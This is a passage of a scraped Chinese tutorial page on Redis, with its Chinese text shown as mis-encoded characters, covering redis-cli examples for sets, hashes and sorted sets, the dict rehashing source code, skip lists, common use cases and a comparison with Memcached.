data-actualsrc=\"https://pic4.zhimg.com/v2-5b0d9c30927111280bcbef0e64b163b7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-html\">&gt; sadd set-key item\n(integer) 1\n&gt; sadd set-key item2\n(integer) 1\n&gt; sadd set-key item3\n(integer) 1\n&gt; sadd set-key item\n(integer) 0\n\n&gt; smembers set-key\n1) &#34;item&#34;\n2) &#34;item2&#34;\n3) &#34;item3&#34;\n\n&gt; sismember set-key item4\n(integer) 0\n&gt; sismember set-key item\n(integer) 1\n\n&gt; srem set-key item2\n(integer) 1\n&gt; srem set-key item2\n(integer) 0\n\n&gt; smembers set-key\n1) &#34;item&#34;\n2) &#34;item3&#34;</code></pre></div><h2>HASH</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-a507f684977f04f7cc1612baace7334f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"600\" class=\"origin_image zh-lightbox-thumb\" width=\"750\" data-original=\"https://pic4.zhimg.com/v2-a507f684977f04f7cc1612baace7334f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;750&#39; height=&#39;600&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"600\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"750\" data-original=\"https://pic4.zhimg.com/v2-a507f684977f04f7cc1612baace7334f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-a507f684977f04f7cc1612baace7334f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-html\">&gt; hset hash-key sub-key1 value1\n(integer) 1\n&gt; hset hash-key sub-key2 value2\n(integer) 1\n&gt; hset hash-key sub-key1 value1\n(integer) 0\n\n&gt; hgetall hash-key\n1) &#34;sub-key1&#34;\n2) &#34;value1&#34;\n3) &#34;sub-key2&#34;\n4) &#34;value2&#34;\n\n&gt; hdel hash-key sub-key2\n(integer) 1\n&gt; hdel hash-key sub-key2\n(integer) 0\n\n&gt; hget hash-key sub-key1\n&#34;value1&#34;\n\n&gt; hgetall hash-key\n1) &#34;sub-key1&#34;\n2) &#34;value1&#34;</code></pre></div><h2>ZSET</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-b5fa7c360f336ab84ee50a107798aa84_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"619\" class=\"origin_image zh-lightbox-thumb\" width=\"770\" data-original=\"https://pic1.zhimg.com/v2-b5fa7c360f336ab84ee50a107798aa84_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;770&#39; height=&#39;619&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"619\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"770\" data-original=\"https://pic1.zhimg.com/v2-b5fa7c360f336ab84ee50a107798aa84_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-b5fa7c360f336ab84ee50a107798aa84_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-html\">&gt; zadd zset-key 728 member1\n(integer) 1\n&gt; zadd zset-key 982 member0\n(integer) 1\n&gt; zadd zset-key 982 member0\n(integer) 0\n\n&gt; zrange zset-key 0 -1 withscores\n1) &#34;member1&#34;\n2) &#34;728&#34;\n3) &#34;member0&#34;\n4) &#34;982&#34;\n\n&gt; zrangebyscore zset-key 0 800 withscores\n1) &#34;member1&#34;\n2) &#34;728&#34;\n\n&gt; zrem zset-key member1\n(integer) 1\n&gt; zrem zset-key member1\n(integer) 0\n\n&gt; zrange zset-key 0 -1 withscores\n1) &#34;member0&#34;\n2) &#34;982&#34;</code></pre></div><h2>ä¸‰ã€æ•°æ®ç»“æ„</h2><h2>å­—å…¸</h2><p>dictht æ˜¯ä¸€ä¸ªæ•£åˆ—è¡¨ç»“æ„ï¼Œä½¿ç”¨æ‹‰é“¾æ³•è§£å†³å“ˆå¸Œå†²çªã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"cm\">/* This is our hash table structure. Every dictionary has two of this as we\n</span><span class=\"cm\"> * implement incremental rehashing, for the old to the new table. */</span>\n<span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"n\">dictht</span> <span class=\"p\">{</span>\n    <span class=\"n\">dictEntry</span> <span class=\"o\">**</span><span class=\"n\">table</span><span class=\"p\">;</span>\n    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">size</span><span class=\"p\">;</span>\n    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">sizemask</span><span class=\"p\">;</span>\n    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">used</span><span class=\"p\">;</span>\n<span class=\"p\">}</span> <span class=\"n\">dictht</span><span class=\"p\">;</span>\n<span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"n\">dictEntry</span> <span class=\"p\">{</span>\n    <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">key</span><span class=\"p\">;</span>\n    <span class=\"k\">union</span> <span class=\"p\">{</span>\n        <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">val</span><span class=\"p\">;</span>\n        <span class=\"n\">uint64_t</span> <span class=\"n\">u64</span><span class=\"p\">;</span>\n        <span class=\"n\">int64_t</span> <span class=\"n\">s64</span><span class=\"p\">;</span>\n        <span class=\"kt\">double</span> <span class=\"n\">d</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span> <span class=\"n\">v</span><span class=\"p\">;</span>\n    <span class=\"k\">struct</span> <span class=\"n\">dictEntry</span> <span class=\"o\">*</span><span class=\"n\">next</span><span class=\"p\">;</span>\n<span class=\"p\">}</span> <span class=\"n\">dictEntry</span><span class=\"p\">;</span></code></pre></div><p>Redis çš„å­—å…¸ dict ä¸­åŒ…å«ä¸¤ä¸ªå“ˆå¸Œè¡¨ dicthtï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿è¿›è¡Œ rehash æ“ä½œã€‚åœ¨æ‰©å®¹æ—¶ï¼Œå°†å…¶ä¸­ä¸€ä¸ª dictht ä¸Šçš„é”®å€¼å¯¹ rehash åˆ°å¦ä¸€ä¸ª dictht ä¸Šé¢ï¼Œå®Œæˆä¹‹åé‡Šæ”¾ç©ºé—´å¹¶äº¤æ¢ä¸¤ä¸ª dictht çš„è§’è‰²ã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"n\">dict</span> <span class=\"p\">{</span>\n    <span class=\"n\">dictType</span> <span class=\"o\">*</span><span class=\"n\">type</span><span class=\"p\">;</span>\n    <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">privdata</span><span class=\"p\">;</span>\n    <span class=\"n\">dictht</span> <span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">];</span>\n    <span class=\"kt\">long</span> <span class=\"n\">rehashidx</span><span class=\"p\">;</span> <span class=\"cm\">/* rehashing not in progress if rehashidx == -1 */</span>\n    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">iterators</span><span class=\"p\">;</span> <span class=\"cm\">/* number of iterators currently running */</span>\n<span class=\"p\">}</span> <span class=\"n\">dict</span><span class=\"p\">;</span></code></pre></div><p>rehash æ“ä½œä¸æ˜¯ä¸€æ¬¡æ€§å®Œæˆï¼Œè€Œæ˜¯é‡‡ç”¨æ¸è¿›æ–¹å¼ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…ä¸€æ¬¡æ€§æ‰§è¡Œè¿‡å¤šçš„ rehash æ“ä½œç»™æœåŠ¡å™¨å¸¦æ¥è¿‡å¤§çš„è´Ÿæ‹…ã€‚</p><p>æ¸è¿›å¼ rehash é€šè¿‡è®°å½• dict çš„ rehashidx å®Œæˆï¼Œå®ƒä» 0 å¼€å§‹ï¼Œç„¶åæ¯æ‰§è¡Œä¸€æ¬¡ rehash éƒ½ä¼šé€’å¢ã€‚ä¾‹å¦‚åœ¨ä¸€æ¬¡ rehash ä¸­ï¼Œè¦æŠŠ dict[0] rehash åˆ° dict[1]ï¼Œè¿™ä¸€æ¬¡ä¼šæŠŠ dict[0] ä¸Š table[rehashidx] çš„é”®å€¼å¯¹ rehash åˆ° dict[1] ä¸Šï¼Œdict[0] çš„ table[rehashidx] æŒ‡å‘ nullï¼Œå¹¶ä»¤ rehashidx++ã€‚</p><p>åœ¨ rehash æœŸé—´ï¼Œæ¯æ¬¡å¯¹å­—å…¸æ‰§è¡Œæ·»åŠ ã€åˆ é™¤ã€æŸ¥æ‰¾æˆ–è€…æ›´æ–°æ“ä½œæ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€æ¬¡æ¸è¿›å¼ rehashã€‚</p><p>é‡‡ç”¨æ¸è¿›å¼ rehash ä¼šå¯¼è‡´å­—å…¸ä¸­çš„æ•°æ®åˆ†æ•£åœ¨ä¸¤ä¸ª dictht ä¸Šï¼Œå› æ­¤å¯¹å­—å…¸çš„æŸ¥æ‰¾æ“ä½œä¹Ÿéœ€è¦åˆ°å¯¹åº”çš„ dictht å»æ‰§è¡Œã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"cm\">/* Performs N steps of incremental rehashing. Returns 1 if there are still\n</span><span class=\"cm\"> * keys to move from the old to the new hash table, otherwise 0 is returned.\n</span><span class=\"cm\"> *\n</span><span class=\"cm\"> * Note that a rehashing step consists in moving a bucket (that may have more\n</span><span class=\"cm\"> * than one key as we use chaining) from the old to the new hash table, however\n</span><span class=\"cm\"> * since part of the hash table may be composed of empty spaces, it is not\n</span><span class=\"cm\"> * guaranteed that this function will rehash even a single bucket, since it\n</span><span class=\"cm\"> * will visit at max N*10 empty buckets in total, otherwise the amount of\n</span><span class=\"cm\"> * work it does would be unbound and the function may block for a long time. */</span>\n<span class=\"kt\">int</span> <span class=\"nf\">dictRehash</span><span class=\"p\">(</span><span class=\"n\">dict</span> <span class=\"o\">*</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">empty_visits</span> <span class=\"o\">=</span> <span class=\"n\">n</span> <span class=\"o\">*</span> <span class=\"mi\">10</span><span class=\"p\">;</span> <span class=\"cm\">/* Max number of empty buckets to visit. */</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">dictIsRehashing</span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">))</span> <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">n</span><span class=\"o\">--</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">used</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"n\">dictEntry</span> <span class=\"o\">*</span><span class=\"n\">de</span><span class=\"p\">,</span> <span class=\"o\">*</span><span class=\"n\">nextde</span><span class=\"p\">;</span>\n\n        <span class=\"cm\">/* Note that rehashidx can&#39;t overflow as we are sure there are more\n</span><span class=\"cm\">         * elements because ht[0].used != 0 */</span>\n        <span class=\"n\">assert</span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">size</span> <span class=\"o\">&gt;</span> <span class=\"p\">(</span><span class=\"kt\">unsigned</span> <span class=\"kt\">long</span><span class=\"p\">)</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"p\">);</span>\n        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">[</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"nb\">NULL</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"o\">++</span><span class=\"p\">;</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">--</span><span class=\"n\">empty_visits</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n        <span class=\"n\">de</span> <span class=\"o\">=</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">[</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"p\">];</span>\n        <span class=\"cm\">/* Move all the keys in this bucket from the old to the new hash HT */</span>\n        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">de</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"n\">uint64_t</span> <span class=\"n\">h</span><span class=\"p\">;</span>\n\n            <span class=\"n\">nextde</span> <span class=\"o\">=</span> <span class=\"n\">de</span><span class=\"o\">-&gt;</span><span class=\"n\">next</span><span class=\"p\">;</span>\n            <span class=\"cm\">/* Get the index in the new hash table */</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">dictHashKey</span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">de</span><span class=\"o\">-&gt;</span><span class=\"n\">key</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">sizemask</span><span class=\"p\">;</span>\n            <span class=\"n\">de</span><span class=\"o\">-&gt;</span><span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">[</span><span class=\"n\">h</span><span class=\"p\">];</span>\n            <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">[</span><span class=\"n\">h</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">de</span><span class=\"p\">;</span>\n            <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">used</span><span class=\"o\">--</span><span class=\"p\">;</span>\n            <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">used</span><span class=\"o\">++</span><span class=\"p\">;</span>\n            <span class=\"n\">de</span> <span class=\"o\">=</span> <span class=\"n\">nextde</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n        <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">[</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">NULL</span><span class=\"p\">;</span>\n        <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"cm\">/* Check if we already rehashed the whole table... */</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">used</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"n\">zfree</span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">table</span><span class=\"p\">);</span>\n        <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n        <span class=\"n\">_dictReset</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">ht</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]);</span>\n        <span class=\"n\">d</span><span class=\"o\">-&gt;</span><span class=\"n\">rehashidx</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"cm\">/* More to rehash... */</span>\n    <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"p\">}</span></code></pre></div><h2>è·³è·ƒè¡¨</h2><p>æ˜¯æœ‰åºé›†åˆçš„åº•å±‚å®ç°ä¹‹ä¸€ã€‚</p><p>è·³è·ƒè¡¨æ˜¯åŸºäºå¤šæŒ‡é’ˆæœ‰åºé“¾è¡¨å®ç°çš„ï¼Œå¯ä»¥çœ‹æˆå¤šä¸ªæœ‰åºé“¾è¡¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-ab1791a0287d321a182005805f4b878e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"907\" data-rawheight=\"206\" class=\"origin_image zh-lightbox-thumb\" width=\"907\" data-original=\"https://pic3.zhimg.com/v2-ab1791a0287d321a182005805f4b878e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;907&#39; height=&#39;206&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"907\" data-rawheight=\"206\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"907\" data-original=\"https://pic3.zhimg.com/v2-ab1791a0287d321a182005805f4b878e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-ab1791a0287d321a182005805f4b878e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>åœ¨æŸ¥æ‰¾æ—¶ï¼Œä»ä¸Šå±‚æŒ‡é’ˆå¼€å§‹æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å¯¹åº”çš„åŒºé—´ä¹‹åå†åˆ°ä¸‹ä¸€å±‚å»æŸ¥æ‰¾ã€‚ä¸‹å›¾æ¼”ç¤ºäº†æŸ¥æ‰¾ 22 çš„è¿‡ç¨‹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-ad77c15310803763750e469d676a04ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"897\" data-rawheight=\"210\" class=\"origin_image zh-lightbox-thumb\" width=\"897\" data-original=\"https://pic2.zhimg.com/v2-ad77c15310803763750e469d676a04ad_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;897&#39; height=&#39;210&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"897\" data-rawheight=\"210\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"897\" data-original=\"https://pic2.zhimg.com/v2-ad77c15310803763750e469d676a04ad_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-ad77c15310803763750e469d676a04ad_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä¸çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ç›¸æ¯”ï¼Œè·³è·ƒè¡¨å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>æ’å…¥é€Ÿåº¦éå¸¸å¿«é€Ÿï¼Œå› ä¸ºä¸éœ€è¦è¿›è¡Œæ—‹è½¬ç­‰æ“ä½œæ¥ç»´æŠ¤å¹³è¡¡æ€§ï¼›</li><li>æ›´å®¹æ˜“å®ç°ï¼›</li><li>æ”¯æŒæ— é”æ“ä½œã€‚</li></ul><h2>å››ã€ä½¿ç”¨åœºæ™¯</h2><h2>è®¡æ•°å™¨</h2><p>å¯ä»¥å¯¹ String è¿›è¡Œè‡ªå¢è‡ªå‡è¿ç®—ï¼Œä»è€Œå®ç°è®¡æ•°å™¨åŠŸèƒ½ã€‚</p><p>Redis è¿™ç§å†…å­˜å‹æ•°æ®åº“çš„è¯»å†™æ€§èƒ½éå¸¸é«˜ï¼Œå¾ˆé€‚åˆå­˜å‚¨é¢‘ç¹è¯»å†™çš„è®¡æ•°é‡ã€‚</p><h2>ç¼“å­˜</h2><p>å°†çƒ­ç‚¹æ•°æ®æ”¾åˆ°å†…å­˜ä¸­ï¼Œè®¾ç½®å†…å­˜çš„æœ€å¤§ä½¿ç”¨é‡ä»¥åŠæ·˜æ±°ç­–ç•¥æ¥ä¿è¯ç¼“å­˜çš„å‘½ä¸­ç‡ã€‚</p><h2>æŸ¥æ‰¾è¡¨</h2><p>ä¾‹å¦‚ DNS è®°å½•å°±å¾ˆé€‚åˆä½¿ç”¨ Redis è¿›è¡Œå­˜å‚¨ã€‚</p><p>æŸ¥æ‰¾è¡¨å’Œç¼“å­˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº† Redis å¿«é€Ÿçš„æŸ¥æ‰¾ç‰¹æ€§ã€‚ä½†æ˜¯æŸ¥æ‰¾è¡¨çš„å†…å®¹ä¸èƒ½å¤±æ•ˆï¼Œè€Œç¼“å­˜çš„å†…å®¹å¯ä»¥å¤±æ•ˆï¼Œå› ä¸ºç¼“å­˜ä¸ä½œä¸ºå¯é çš„æ•°æ®æ¥æºã€‚</p><h2>æ¶ˆæ¯é˜Ÿåˆ—</h2><p>List æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¯ä»¥é€šè¿‡ lpush å’Œ rpop å†™å…¥å’Œè¯»å–æ¶ˆæ¯</p><p>ä¸è¿‡æœ€å¥½ä½¿ç”¨ Kafkaã€RabbitMQ ç­‰æ¶ˆæ¯ä¸­é—´ä»¶ã€‚</p><h2>ä¼šè¯ç¼“å­˜</h2><p>å¯ä»¥ä½¿ç”¨ Redis æ¥ç»Ÿä¸€å­˜å‚¨å¤šå°åº”ç”¨æœåŠ¡å™¨çš„ä¼šè¯ä¿¡æ¯ã€‚</p><p>å½“åº”ç”¨æœåŠ¡å™¨ä¸å†å­˜å‚¨ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Œä¹Ÿå°±ä¸å†å…·æœ‰çŠ¶æ€ï¼Œä¸€ä¸ªç”¨æˆ·å¯ä»¥è¯·æ±‚ä»»æ„ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œä»è€Œæ›´å®¹æ˜“å®ç°é«˜å¯ç”¨æ€§ä»¥åŠå¯ä¼¸ç¼©æ€§ã€‚</p><h2>åˆ†å¸ƒå¼é”å®ç°</h2><p>åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œæ— æ³•ä½¿ç”¨å•æœºç¯å¢ƒä¸‹çš„é”æ¥å¯¹å¤šä¸ªèŠ‚ç‚¹ä¸Šçš„è¿›ç¨‹è¿›è¡ŒåŒæ­¥ã€‚</p><p>å¯ä»¥ä½¿ç”¨ Redis è‡ªå¸¦çš„ SETNX å‘½ä»¤å®ç°åˆ†å¸ƒå¼é”ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ RedLock åˆ†å¸ƒå¼é”å®ç°ã€‚</p><h2>å…¶å®ƒ</h2><p>Set å¯ä»¥å®ç°äº¤é›†ã€å¹¶é›†ç­‰æ“ä½œï¼Œä»è€Œå®ç°å…±åŒå¥½å‹ç­‰åŠŸèƒ½ã€‚</p><p>ZSet å¯ä»¥å®ç°æœ‰åºæ€§æ“ä½œï¼Œä»è€Œå®ç°æ’è¡Œæ¦œç­‰åŠŸèƒ½ã€‚</p><h2>äº”ã€Redis ä¸ Memcached</h2><p>ä¸¤è€…éƒ½æ˜¯éå…³ç³»å‹å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸åŒï¼š</p><h2>æ•°æ®ç±»å‹</h2><p>Memcached ä»…æ”¯æŒå­—ç¬¦ä¸²ç±»å‹ï¼Œè€Œ Redis æ”¯æŒäº”ç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æ›´çµæ´»åœ°è§£å†³é—®é¢˜ã€‚</p><h2>æ•°æ®æŒä¹…åŒ–</h2><p>Redis æ”¯æŒä¸¤ç§æŒä¹…åŒ–ç­–ç•¥ï¼šRDB å¿«ç…§å’Œ AOF æ—¥å¿—ï¼Œè€Œ Memcached ä¸æ”¯æŒæŒä¹…åŒ–ã€‚</p><h2>åˆ†å¸ƒå¼</h2><p>Memcached ä¸æ”¯æŒåˆ†å¸ƒå¼ï¼Œåªèƒ½é€šè¿‡åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œæ¥å®ç°åˆ†å¸ƒå¼å­˜å‚¨ï¼Œè¿™ç§æ–¹å¼åœ¨å­˜å‚¨å’ŒæŸ¥è¯¢æ—¶éƒ½éœ€è¦å…ˆåœ¨å®¢æˆ·ç«¯è®¡ç®—ä¸€æ¬¡æ•°æ®æ‰€åœ¨çš„èŠ‚ç‚¹ã€‚</p><p>Redis Cluster å®ç°äº†åˆ†å¸ƒå¼çš„æ”¯æŒã€‚</p><h2>å†…å­˜ç®¡ç†æœºåˆ¶</h2><ul><li> åœ¨ Redis ä¸­ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ•°æ®éƒ½ä¸€ç›´å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥å°†ä¸€äº›å¾ˆä¹…æ²¡ç”¨çš„ value äº¤æ¢åˆ°ç£ç›˜ï¼Œè€Œ Memcached çš„æ•°æ®åˆ™ä¼šä¸€ç›´åœ¨å†…å­˜ä¸­ã€‚<br/> </li><li> Memcached å°†å†…å­˜åˆ†å‰²æˆç‰¹å®šé•¿åº¦çš„å—æ¥å­˜å‚¨æ•°æ®ï¼Œä»¥å®Œå…¨è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼ä¼šä½¿å¾—å†…å­˜çš„åˆ©ç”¨ç‡ä¸é«˜ï¼Œä¾‹å¦‚å—çš„å¤§å°ä¸º 128 bytesï¼Œåªå­˜å‚¨ 100 bytes çš„æ•°æ®ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„ 28 bytes å°±æµªè´¹æ‰äº†ã€‚<br/> </li></ul><h2>å…­ã€é”®çš„è¿‡æœŸæ—¶é—´</h2><p>Redis å¯ä»¥ä¸ºæ¯ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå½“é”®è¿‡æœŸæ—¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤è¯¥é”®ã€‚</p><p>å¯¹äºæ•£åˆ—è¡¨è¿™ç§å®¹å™¨ï¼Œåªèƒ½ä¸ºæ•´ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆæ•´ä¸ªæ•£åˆ—è¡¨ï¼‰ï¼Œè€Œä¸èƒ½ä¸ºé”®é‡Œé¢çš„å•ä¸ªå…ƒç´ è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚</p><h2>ä¸ƒã€æ•°æ®æ·˜æ±°ç­–ç•¥</h2><p>å¯ä»¥è®¾ç½®å†…å­˜æœ€å¤§ä½¿ç”¨é‡ï¼Œå½“å†…å­˜ä½¿ç”¨é‡è¶…å‡ºæ—¶ï¼Œä¼šæ–½è¡Œæ•°æ®æ·˜æ±°ç­–ç•¥ã€‚</p><p>Redis å…·ä½“æœ‰ 6 ç§æ·˜æ±°ç­–ç•¥ï¼š</p><p>| ç­–ç•¥ | æè¿° | | :--: | :--: | | volatile-lru | 